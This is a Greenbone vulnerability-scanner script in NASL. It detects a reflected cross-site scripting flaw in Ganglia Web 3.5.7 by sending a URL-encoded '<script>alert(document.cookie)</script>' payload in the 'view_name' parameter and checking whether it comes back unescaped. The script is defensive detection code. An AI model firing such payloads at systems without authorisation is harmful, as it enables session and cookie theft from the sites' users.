# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:ganglia:ganglia-web";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804557");
  script_version("2023-07-26T05:05:09+0000");
  script_cve_id("CVE-2013-1770", "CVE-2013-0275");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-04-25 19:23:38 +0530 (Fri, 25 Apr 2014)");
  script_name("Ganglia Web 'view_name' Cross-Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_ganglia_detect.nasl");
  script_mandatory_keys("ganglia/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://secunia.com/advisories/52673");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57870");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58204");
  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2013/q1/273");
  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2013/q1/460");

  script_tag(name:"summary", value:"Ganglia Web is prone to a cross-site scripting (XSS) vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able
  read the cookie or not.");
  script_tag(name:"insight", value:"Input passed via the 'view_name' GET parameter to views_view.php is not
  properly sanitised before being returned to the user.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a users browser session in context of an affected site.");
  script_tag(name:"affected", value:"Ganglia Web version 3.5.7, Other versions may also be affected.");
  script_tag(name:"solution", value:"Update to version 3.5.8 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://ganglia.info");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

url = dir + "/views_view.php?add_to_view=1&view_name=%3C"+
            "script%3Ealert(document.cookie)%3C/script%3E";

if( http_vuln_check( port:port, url:url, check_header:TRUE,
    pattern:"<script>alert\(document.cookie\)</script>",
    extra_check:"This should not happen" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
